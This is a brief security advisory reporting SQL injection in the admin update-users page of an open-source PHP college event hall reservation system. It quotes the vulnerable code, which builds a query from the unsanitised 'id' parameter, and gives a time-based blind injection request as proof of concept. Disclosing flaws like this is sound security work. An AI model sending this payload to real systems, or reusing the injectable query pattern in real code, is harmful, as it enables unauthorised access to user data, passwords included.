# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - SQL Injection update-users.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /admin/update-users.php

## Code
```php
 if(isset($_GET['id'])){
                    $user_id1=$_GET['id'];
                    $sql1="SELECT * FROM tbl_user WHERE user_id='$user_id1'";
                    $res1=mysqli_query($conn,$sql1);
                    if($res1==True){
                        while($row=mysqli_fetch_assoc($res1)){
                            $userid=$row['user_id'];
                            $username=$row['user_name'];
                            $userdept=$row['user_dept'];
                            $useremail=$row['user_email'];
                            $userpassword=$row['user_password'];
                        }
                    }
                }
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/update-users.php?id='+or+1%3dsleep(5)+%23 HTTP/1.1
Host: [REDACTED]
```

## Screenshot


